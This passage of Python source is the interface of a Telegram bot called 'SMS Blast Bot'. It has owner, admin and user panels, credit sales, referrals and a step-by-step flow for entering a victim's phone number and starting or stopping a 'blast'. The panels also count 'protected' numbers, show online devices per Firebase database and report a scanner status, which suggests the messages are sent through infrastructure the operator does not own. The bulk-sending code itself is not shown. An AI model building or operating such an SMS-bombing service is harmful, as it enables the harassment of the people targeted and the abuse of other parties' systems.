    lines = [
        f"{em(EMOJI_CROSS, '⛔')} <b>{sc('bot use karne ke liye pehle join karein!')}</b>\n\n",
        f"{em(EMOJI_BELL, '👇')} ɴɪᴄʜᴇ ᴅɪʏᴇ ɢᴀʏᴇ ᴄʜᴀɴɴᴇʟs/ɢʀᴏᴜᴘs ᴊᴏɪɴ ᴋᴀʀᴇɪɴ:",
    ]
    for ch in missing:
        lines.append(f"\n• <a href='{esc(ch['link'])}'>{esc(ch.get('title', 'Channel'))}</a>")
    lines.append(f"\n\n<i>{sc('join karne ke baad /start karein ya refresh dabayein.')}</i>")
    return "\n".join(lines)


def force_join_kb(missing: list) -> InlineKeyboardMarkup:
    rows = []
    for ch in missing:
        rows.append([btn_url(f"ᴊᴏɪɴ {ch.get('title', 'Channel')}", ch["link"], EMOJI_BELL, "🔔", style="primary")])
    rows.append([btn("ʀᴇғʀᴇsʜ / ᴄʜᴇᴄᴋ", "fj:check", EMOJI_GEAR, "🔄", style="success")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def owner_panel_text(d: dict) -> str:
    fbs = d.get("firebases", [])
    owners = d.get("owners", [])
    admins = d.get("admins", [])
    users = d.get("users", {})
    stats = d.get("stats", {})
    videos = d.get("videos", [])
    auto_cfg = d.get("auto_msg", {})
    auto_status = f"{em(EMOJI_CHECK, '🟢')} 1ᴍ ᴏɴ" if auto_cfg.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ"
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ ʀᴇǫᴜɪʀᴇᴅ"
    fj = d.get("force_join", {})
    fj_status = f"{em(EMOJI_CHECK, '🟢')} ᴏɴ" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()

    fb_lines = []
    for _, fb_data in FB_DEVICE_COUNTS.items():
        age = int(time.time() - fb_data.get("last_update", 0))
        status = em(EMOJI_CHECK, "🟢") if age < 60 else em(EMOJI_WARNING, "🟡") if age < 300 else em(EMOJI_CROSS, "🔴")
        fb_lines.append(f"  {status} {esc(fb_data['label'][:20])}: {fb_data['online']} ᴏɴʟɪɴᴇ")
    fb_summary = "\n".join(fb_lines) if fb_lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"

    protected_count = len(d.get("protected_numbers", {}) or PROTECTED_NUMBERS)

    return (
        f"✨ <b>{sc('bot made by flexxxyyy')}</b> ✨\n"
        f"{em(EMOJI_CROWN, '👑')} <b>{sc('owner panel')}</b> — sᴍs ʙʟᴀsᴛ ʙᴏᴛ {esc(_VERSION)}\n"
        f"<b>Owner:</b> {esc(SUPER_ADMIN_NAME)}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(fbs)}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} sᴜᴘᴇʀ ᴀᴅᴍɪɴs  : <b>{len(owners)}</b>/6\n"
        f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴs        : <b>{len(admins)}</b>\n"
        f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs        : <b>{len(videos)}</b>\n"
        f"{em(EMOJI_BELL, '🔔')} ᴀᴜᴛᴏ 1ᴍ ᴍsɢ  : {auto_status}\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"{em(EMOJI_BELL, '📢')} ғᴏʀᴄᴇ ᴊᴏɪɴ    : {fj_status}\n"
        f"{em(EMOJI_MONEY, '💳')} ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs : <b>{len(d.get('pricing', {}).get('plans', []))}</b>\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{protected_count}</b>\n"
        f"{em(EMOJI_PHONE, '📱')} ᴘᴇʀ ғɪʀᴇʙᴀsᴇ  :\n{fb_summary}\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )


def admin_panel_text(d: dict) -> str:
    users = d.get("users", {})
    stats = d.get("stats", {})
    banned = d.get("banned", [])
    videos = d.get("videos", [])
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ ʀᴇǫᴜɪʀᴇᴅ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()

    fb_lines = []
    for _, fb_data in FB_DEVICE_COUNTS.items():
        age = int(time.time() - fb_data.get("last_update", 0))
        status = em(EMOJI_CHECK, "🟢") if age < 60 else em(EMOJI_WARNING, "🟡") if age < 300 else em(EMOJI_CROSS, "🔴")
        fb_lines.append(f"  {status} {esc(fb_data['label'][:20])}: {fb_data['online']} ᴏɴʟɪɴᴇ")
    fb_summary = "\n".join(fb_lines) if fb_lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"

    protected_count = len(d.get("protected_numbers", {}) or PROTECTED_NUMBERS)

    return (
        f"✨ <b>{sc('bot made by flexxxyyy')}</b> ✨\n"
        f"{em(EMOJI_SHIELD, '🛡')} <b>{sc('admin panel')}</b> — sᴍs ʙʟᴀsᴛ ʙᴏᴛ {esc(_VERSION)}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs        : <b>{len(videos)}</b>\n"
        f"{em(EMOJI_CROSS, '🚫')} ʙᴀɴɴᴇᴅ        : <b>{len(banned)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(d.get('firebases', []))}</b>\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{protected_count}</b>\n"
        f"{em(EMOJI_PHONE, '📱')} ᴘᴇʀ ғɪʀᴇʙᴀsᴇ  :\n{fb_summary}\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )


def user_home_text(uid: int, d: dict) -> str:
    udata = d.get("users", {}).get(str(uid), {})
    fbs = d.get("firebases", [])
    credits = udata.get("credits", 0)
    scan_info = get_scan_status()
    return (
        f"✨ <b>{sc('bot made by flexxxyyy')}</b> ✨\n"
        f"{em(EMOJI_PHONE, '📱')} <b>sᴍs ʙʟᴀsᴛ ʙᴏᴛ {esc(_VERSION)}</b>\n"
        f"<b>Owner:</b> {esc(SUPER_ADMIN_NAME)}\n\n"
        f"{em(EMOJI_STAR, '👤')} ʀᴏʟᴇ    : {role_tag(uid, d)}\n"
        f"{em(EMOJI_MONEY, '💰')} ᴄʀᴇᴅɪᴛs : <b>{credits}</b>\n"
        f"{em(EMOJI_STAR, '🔢')} ᴜsᴇs    : <b>{udata.get('uses', 0)}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ᴀᴘɪs    : <b>{len(fbs)}</b> ғɪʀᴇʙᴀsᴇ(s)\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ : {scan_info}\n\n"
        f"ᴛᴀᴘ <b>{sc('send sms')}</b> ᴛᴏ sᴛᴀʀᴛ {em(EMOJI_ROCKET, '🚀')}"
    )


def owner_kb(d: dict) -> InlineKeyboardMarkup:
    mode_btn = (
        f"🔴 {sc('disable free mode')}",
        "owner:free:off",
        "danger",
    ) if d.get("free_mode") else (
        f"🟢 {sc('enable free mode')}",
        "owner:free:on",
        "success",
    )
    auto_on = bool(d.get("auto_msg", {}).get("enabled"))
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                btn("sᴇɴᴅ sᴍs", "owner:send", EMOJI_ROCKET, "📤", style="success"),
                btn("ᴍᴀɴᴀɢᴇ ғɪʀᴇʙᴀsᴇ", "owner:fb:menu:0", EMOJI_FIRE, "🔥", style="primary"),
            ],
            [
                btn("ᴀᴜᴛᴏ 1ᴍ ᴍsɢ", "owner:automsg:menu", EMOJI_BELL, "🔔", style="success" if auto_on else "primary"),
                btn("ᴄʟᴇᴀɴ ʙᴀᴅ ғʙ", "owner:fb:clean_bad", EMOJI_CROSS, "🧹", style="danger"),
            ],
            [
                btn("ᴍᴀɴᴀɢᴇ ᴠɪᴅᴇᴏs", "owner:videos:menu", EMOJI_VIDEO, "📹", style="primary"),
                btn("ᴍᴀɴᴀɢᴇ sᴜᴘᴇʀ ᴀᴅᴍɪɴs", "owner:owners:menu", EMOJI_CROWN, "👑", style="primary"),
            ],
            [
                btn("ᴍᴀɴᴀɢᴇ ᴀᴅᴍɪɴs", "owner:admins:menu", EMOJI_SHIELD, "🛡", style="primary"),
                btn("ᴠɪᴇᴡ ᴜsᴇʀs", "owner:users:list", EMOJI_STAR, "👥", style="primary"),
            ],
            [
                btn("ʙᴀɴ ᴜsᴇʀ", "owner:ban", EMOJI_CROSS, "🚫", style="danger"),
                btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "owner:unban:menu", EMOJI_CHECK, "✅", style="success"),
            ],
            [
                btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "owner:broadcast", EMOJI_BELL, "📢", style="primary"),
                btn("ᴀᴘɪ sᴛᴀᴛs", "owner:stats", EMOJI_STAR, "📊", style="primary"),
            ],
            [
                btn("ᴀᴄᴛɪᴠɪᴛɪ ʟᴏɢ", "owner:activity", EMOJI_GEAR, "📜", style="primary"),
                btn("ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs", "owner:pricing:menu", EMOJI_MONEY, "💳", style="primary"),
            ],
            [
                btn("ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs", "owner:redeem:menu", EMOJI_GIFT, "🎁", style="success"),
                btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs", "owner:credits:add", EMOJI_MONEY, "💰", style="success"),
            ],
            [
                btn("ᴅᴇᴅᴜᴄᴛ ᴄʀᴇᴅɪᴛs", "owner:credits:deduct", EMOJI_CROSS, "💸", style="danger"),
                btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs ᴀʟʟ", "owner:add_all_credits", EMOJI_MONEY, "💰", style="success"),
            ],
            [
                btn("ᴅᴇᴅᴜᴄᴛ ᴀʟʟ", "owner:deduct_all_credits", EMOJI_CROSS, "🗑", style="danger"),
                btn("ғᴏʀᴄᴇ ᴊᴏɪɴ", "owner:fj:menu", EMOJI_BELL, "🔗", style="primary"),
            ],
            [
                btn("sᴇᴛᴛɪɴɢs", "owner:settings", EMOJI_GEAR, "⚙️", style="primary"),
                btn("sᴍs ʜɪsᴛᴏʀʏ", "owner:sms_history", EMOJI_STAR, "📋", style="primary"),
            ],
            [
                btn("ᴇxᴘᴏʀᴛ sᴄʀɪᴘᴛ", "owner:export_script", EMOJI_GEAR, "📤", style="primary"),
                btn("ᴘʀᴏᴛᴇᴄᴛ ɴᴜᴍʙᴇʀ", "owner:protect", EMOJI_LOCK, "🔒", style="primary"),
            ],
            [
                btn("ᴘʀᴏᴛᴇᴄᴛᴇᴅ ʟɪsᴛ", "owner:protected_list", EMOJI_LOCK, "🔐", style="primary"),
                btn("ᴛʀᴀᴄᴋ ɴᴜᴍʙᴇʀ", "owner:track", EMOJI_STAR, "📊", style="primary"),
            ],
            [InlineKeyboardButton(text=mode_btn[0], callback_data=mode_btn[1], style=mode_btn[2])],
            [btn("ʀᴇғʀᴇsʜ", "owner:refresh", EMOJI_GEAR, "🔄", style="success")],
        ]
    )


def admin_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                btn("sᴇɴᴅ sᴍs", "admin:send", EMOJI_ROCKET, "📤", style="success"),
                btn("ᴍᴀɴᴀɢᴇ ᴠɪᴅᴇᴏs", "owner:videos:menu", EMOJI_VIDEO, "📹", style="primary"),
            ],
            [
                btn("ᴠɪᴇᴡ ᴜsᴇʀs", "admin:users:list", EMOJI_STAR, "👥", style="primary"),
                btn("ᴀᴘɪ sᴛᴀᴛs", "admin:stats", EMOJI_STAR, "📊", style="primary"),
            ],
            [
                btn("ʙᴀɴ ᴜsᴇʀ", "admin:ban", EMOJI_CROSS, "🚫", style="danger"),
                btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "admin:unban:menu", EMOJI_CHECK, "✅", style="success"),
            ],
            [btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "admin:broadcast", EMOJI_BELL, "📢", style="primary")],
            [btn("ʀᴇғʀᴇsʜ", "admin:refresh", EMOJI_GEAR, "🔄", style="success")],
        ]
    )


def user_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [btn("sᴇɴᴅ sᴍs", "user:send", EMOJI_ROCKET, "📤", style="success")],
            [
                btn("ᴠɪᴅᴇᴏs", "user:random_video", EMOJI_VIDEO, "📹", style="primary"),
                btn("ᴄʀᴇᴅɪᴛs", "user:credits", EMOJI_MONEY, "💳", style="primary"),
            ],
            [
                btn("ʀᴇᴅᴇᴇᴍ", "user:redeem", EMOJI_GIFT, "🎁", style="success"),
                btn("ʀᴇғᴇʀ", "user:refer", EMOJI_STAR, "👥", style="primary"),
            ],
            [
                btn("sᴛᴀᴛs", "user:stats", EMOJI_STAR, "📊", style="primary"),
                btn("ᴍʏ sᴍs ʜɪsᴛᴏʀʏ", "user:sms_history", EMOJI_STAR, "📜", style="primary"),
            ],
            [
                btn("ʙᴜʏ ᴄʀᴇᴅɪᴛs", "user:pricing", EMOJI_MONEY, "💰", style="success"),
                btn("ᴛʀᴀɴsғᴇʀ ᴄʀᴇᴅɪᴛs", "user:transfer", EMOJI_MONEY, "💸", style="primary"),
            ],
            [btn("ɪɴғᴏ", "user:info", EMOJI_GEAR, "ℹ️", style="primary")],
        ]
    )
def videos_menu_kb(d: dict) -> InlineKeyboardMarkup:
    videos = d.get("videos", [])
    rows = [
        [btn("ᴀᴅᴅ ᴠɪᴅᴇᴏ", "owner:videos:add", EMOJI_CHECK, "➕", style="success")],
        [btn("ʙᴜʟᴋ ᴅᴇʟᴇᴛᴇ ᴀʟʟ ᴠɪᴅᴇᴏs", "owner:videos:bulk_del", EMOJI_CROSS, "🗑", style="danger")],
    ]
    for idx, _ in enumerate(videos, 1):
        rows.append(
            [
                btn(f"Video #{idx}", "noop", EMOJI_VIDEO, "📹", style="primary"),
                btn("ʀᴇᴍᴏᴠᴇ", f"owner:videos:del:{idx - 1}", EMOJI_CROSS, "🗑", style="danger"),
            ]
        )
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def fb_menu_kb(d: dict, page: int = 0) -> InlineKeyboardMarkup:
    fbs = d.get("firebases", [])
    per_page = 8
    total_pages = max(1, (len(fbs) + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))

    start_idx = page * per_page
    end_idx = start_idx + per_page
    current_fbs = fbs[start_idx:end_idx]

    rows = [
        [
            btn("ᴀᴅᴅ ғɪʀᴇʙᴀsᴇ", "owner:fb:add", EMOJI_CHECK, "➕", style="success"),
            btn("ᴀᴅᴅ ᴠɪᴀ ᴛxᴛ", "owner:fb:add_file", EMOJI_CHECK, "📄", style="primary"),
        ],
        [
            btn("ᴄʟᴇᴀɴ ʙᴀᴅ / ᴇxᴘɪʀᴇᴅ", "owner:fb:clean_bad", EMOJI_CROSS, "🧹", style="danger"),
        ],
    ]
    for fb in current_fbs:
        label = fb.get("label", fb["url"].replace("https://", ""))
        if len(label) > 16:
            label = label[:14] + ".."
        rows.append(
            [
                btn(label, "noop", EMOJI_FIRE, "🔥", style="primary"),
                btn("ʀᴇᴍᴏᴠᴇ", f"owner:fb:del:{fb['id']}:{page}", EMOJI_CROSS, "🗑", style="danger"),
            ]
        )

    nav_row = []
    if page > 0:
        nav_row.append(btn("◀️ ᴘʀᴇᴠ", f"owner:fb:menu:{page - 1}", EMOJI_GEAR, "◀️", style="primary"))
    if page < total_pages - 1:
        nav_row.append(btn("ɴᴇxᴛ ▶️", f"owner:fb:menu:{page + 1}", EMOJI_GEAR, "▶️", style="primary"))
    if nav_row:
        rows.append(nav_row)

    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def auto_msg_kb(d: dict) -> InlineKeyboardMarkup:
    auto_cfg = d.get("auto_msg", {})
    enabled = bool(auto_cfg.get("enabled"))
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                btn("sᴇᴛ / ᴄʜᴀɴɢᴇ ᴍsɢ", "owner:automsg:set", EMOJI_BELL, "✍️", style="success"),
                btn(
                    "sᴛᴏᴘ ᴀᴜᴛᴏ ᴍsɢ" if enabled else "sᴛᴀʀᴛ ᴀᴜᴛᴏ ᴍsɢ",
                    "owner:automsg:toggle",
                    EMOJI_CROSS if enabled else EMOJI_CHECK,
                    "🛑" if enabled else "▶️",
                    style="danger" if enabled else "success",
                ),
            ],
            [btn("sᴇɴᴅ ɴᴏᴡ (1ᴍ ʟᴏᴏᴘ)", "owner:automsg:now", EMOJI_ROCKET, "⚡", style="primary")],
            [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")],
        ]
    )


def owners_menu_kb(d: dict) -> InlineKeyboardMarkup:
    owners = d.get("owners", [])
    rows = []
    if len(owners) < 6:
        rows.append([btn("ᴀᴅᴅ sᴜᴘᴇʀ ᴀᴅᴍɪɴ", "owner:owners:add", EMOJI_CHECK, "➕", style="success")])
    for oid in owners:
        if oid == MAIN_OWNER:
            rows.append([btn(f"{oid} (ᴍᴀɪɴ)", "noop", EMOJI_CROWN, "👑", style="primary")])
        else:
            rows.append(
                [
                    btn(f"{oid}", "noop", EMOJI_CROWN, "🔱", style="primary"),
                    btn("ʀᴇᴍᴏᴠᴇ", f"owner:owners:del:{oid}", EMOJI_CROSS, "🗑", style="danger"),
                ]
            )
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def admins_menu_kb(d: dict) -> InlineKeyboardMarkup:
    admins = d.get("admins", [])
    rows = [[btn("ᴀᴅᴅ ᴀᴅᴍɪɴ", "owner:admins:add", EMOJI_CHECK, "➕", style="success")]]
    for aid in admins:
        rows.append(
            [
                btn(f"{aid}", "noop", EMOJI_SHIELD, "🛡", style="primary"),
                btn("ʀᴇᴍᴏᴠᴇ", f"owner:admins:del:{aid}", EMOJI_CROSS, "🗑", style="danger"),
            ]
        )
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def unban_menu_kb(d: dict, prefix: str) -> InlineKeyboardMarkup:
    banned = d.get("banned", [])
    rows = []
    for bid in banned:
        rows.append([btn(f"{bid}", f"{prefix}:unban:do:{bid}", EMOJI_CHECK, "🔓", style="success")])
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def users_list_kb(d: dict, prefix: str, page: int = 0) -> tuple[str, InlineKeyboardMarkup]:
    users = d.get("users", {})
    items = list(users.items())
    per = 10
    start = page * per
    chunk = items[start : start + per]
    approved = d.get("approved", [])
    banned = d.get("banned", [])

    lines = [f"{em(EMOJI_STAR, '👥')} <b>{sc('users')} ({len(items)} ᴛᴏᴛᴀʟ)</b>\n"]
    for uid_str, udata in chunk:
        uid = int(uid_str)
        name = esc(udata.get("name", "Unknown"))
        uses = udata.get("uses", 0)
        credits = udata.get("credits", 0)
        if uid in banned:
            status = em(EMOJI_CROSS, "🚫")
        elif uid in approved:
            status = em(EMOJI_CHECK, "✅")
        elif is_owner(uid, d):
            status = em(EMOJI_CROWN, "👑")
        elif uid in d.get("admins", []):
            status = em(EMOJI_SHIELD, "🛡")
        else:
            status = em(EMOJI_STAR, "👤")
        lines.append(f"{status} <code>{uid}</code> — {name[:18]} | {em(EMOJI_MONEY, '💰')}{credits} | {em(EMOJI_CHECK, '📤')}{uses}")

    text = "\n".join(lines)
    rows = []
    nav = []
    if page > 0:
        nav.append(btn("◀️ ᴘʀᴇᴠ", f"{prefix}:users:pg:{page - 1}", EMOJI_GEAR, "◀️", style="primary"))
    if start + per < len(items):
        nav.append(btn("ɴᴇxᴛ ▶️", f"{prefix}:users:pg:{page + 1}", EMOJI_GEAR, "▶️", style="primary"))
    if nav:
        rows.append(nav)
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙", style="primary")])
    return text, InlineKeyboardMarkup(inline_keyboard=rows)


def api_stats_text(d: dict) -> str:
    stats = d.get("stats", {})
    api_use = stats.get("api_usage", {})
    fbs = {fb["id"]: fb for fb in d.get("firebases", [])}

    lines = [
        f"{em(EMOJI_STAR, '📊')} <b>{sc('api stats')}</b>\n",
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ   : <b>{stats.get('total_sent', 0)}</b>",
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ : <b>{stats.get('total_failed', 0)}</b>\n",
        "━━━━━━━━━━━━━━━━━━",
        f"<b>{sc('per firebase:')}</b>",
    ]
    if not api_use:
        lines.append(f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴜsᴀɢᴇ ʏᴇᴛ.")
    for fb_id, fb_stats in api_use.items():
        fb = fbs.get(fb_id)
        label = esc(fb.get("label", fb_id[:20]) if fb else fb_id[:20])
        sent = fb_stats.get("sent", 0)
        failed = fb_stats.get("failed", 0)
        lines.append(f"{em(EMOJI_FIRE, '🔥')} {label}\n   {em(EMOJI_CHECK, '✅')} {sent} sᴇɴᴛ  {em(EMOJI_CROSS, '❌')} {failed} ғᴀɪʟᴇᴅ")
    return "\n".join(lines)


R = Router()


async def _handle_start_common(msg: Message, state: FSMContext, referral_code: str = ""):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))
    await play_startup_aesthetic(msg.bot, msg.chat.id)

    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    sync_runtime_state(d)
    is_new = reg_user(uid, name, d)

    if is_new:
        log_text = (
            f"🆕 <b>NEW USER JOINED</b>\n\n"
            f"👤 <b>Name:</b> {esc(name)}\n"
            f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
            f"🌐 <b>Username:</b> {esc(username)}\n"
            f"📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>"
        )
        asyncio.create_task(send_channel_log(msg.bot, log_text))

    if referral_code.startswith("REF"):
        if not d.get("users", {}).get(str(uid), {}).get("referred_by"):
            success, _, referrer = process_referral(uid, referral_code, d)
            if success and referrer:
                try:
                    ref_name = esc(d.get("users", {}).get(str(uid), {}).get("name", "Someone"))
                    await msg.bot.send_message(
                        referrer,
                        f"{em(EMOJI_GIFT, '🎉')} <b>{ref_name}</b> ne aapka referral code use kiya!\n"
                        f"{em(EMOJI_MONEY, '💰')} Aapko +{d['settings']['ref_credits']} credits mile hain.\n"
                        f"{em(EMOJI_MONEY, '💰')} Unko bhi +{d['settings']['ref_credits']} credits mile hain.",
                        parse_mode="HTML",
                    )
                except Exception:
                    pass

    save(d)

    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(
            force_join_text(missing),
            reply_markup=force_join_kb(missing),
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
        return

    await send_random_video(
        msg.bot,
        msg.chat.id,
        caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome to SMS Blast Bot!\nCreator: FLEXXYYY\nOwner: {esc(SUPER_ADMIN_NAME)}",
    )

    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if is_banned(uid, d):
        await msg.answer(
            f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>\nAdmin se contact karein.",
            parse_mode="HTML",
        )
        return
    if not can_use(uid, d):
        await msg.answer(
            f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi hai!</b>\n\nOwner se approval lein.",
            parse_mode="HTML",
        )
        return

    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")
    await msg.answer(
        f"{em(EMOJI_GEAR, '⌨️')} <b>{sc('quick controls enabled')}</b>",
        reply_markup=default_reply_keyboard(),
        parse_mode="HTML",
    )


@R.message(CommandStart(deep_link=True))
async def cmd_start_deep(msg: Message, state: FSMContext):
    args = (msg.text or "").split()
    code = args[1].strip() if len(args) > 1 else ""
    await _handle_start_common(msg, state, referral_code=code)


@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await _handle_start_common(msg, state, referral_code="")


# Reply keyboard quick buttons
@R.message(F.text == sc("🚀 Start Blast"))
async def reply_quick_start_blast(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not can_use(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} Access nahi hai!", parse_mode="HTML")
        return
    await state.set_state(S.send_number)
    await msg.answer(
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML",
    )


@R.message(F.text == sc("📹 Videos"))
async def reply_quick_videos(msg: Message, state: FSMContext):
    d = load()
    if not d.get("videos"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Abhi koi video available nahi hai!", parse_mode="HTML")
        return
    await send_random_video(msg.bot, msg.chat.id, caption=f"{em(EMOJI_VIDEO, '📹')} Enjoy your video!")


@R.message(F.text == sc("💰 Credits"))
async def reply_quick_credits(msg: Message, state: FSMContext):
    d = load()
    credits = get_user_credits(msg.from_user.id, d)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💰')} <b>Your Credits:</b> <b>{credits}</b>\n<b>Owner:</b> {esc(SUPER_ADMIN_NAME)}",
        parse_mode="HTML",
    )


@R.message(F.text == sc("🛑 Stop Blast"))
async def reply_quick_stop(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    async with SESSIONS_LOCK:
        session = USER_SESSIONS.get(uid)
        if not session or (session.task and session.task.done()):
            await msg.answer(f"{em(EMOJI_CHECK, '✅')} Koi active sending nahi chal rahi.", parse_mode="HTML")
            return
        session.cancelled = True
    await msg.answer(f"{em(EMOJI_CROSS, '🛑')} Stop signal bhej diya gaya hai!", parse_mode="HTML")


@R.callback_query(F.data == "fj:check")
async def fj_check(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("❌ Abhi bhi join nahi kiya!", show_alert=True)
        try:
            await cq.message.edit_text(
                force_join_text(missing),
                reply_markup=force_join_kb(missing),
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
        except Exception:
            pass
        return

    await cq.answer("✅ Verified!", show_alert=True)
    await send_random_video(
        cq.bot,
        cq.message.chat.id,
        caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome! Verified Successfully.\nOwner: {esc(SUPER_ADMIN_NAME)}",
    )

    if is_owner(uid, d):
        await cq.message.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    elif is_admin(uid, d):
        await cq.message.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    else:
        await cq.message.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")


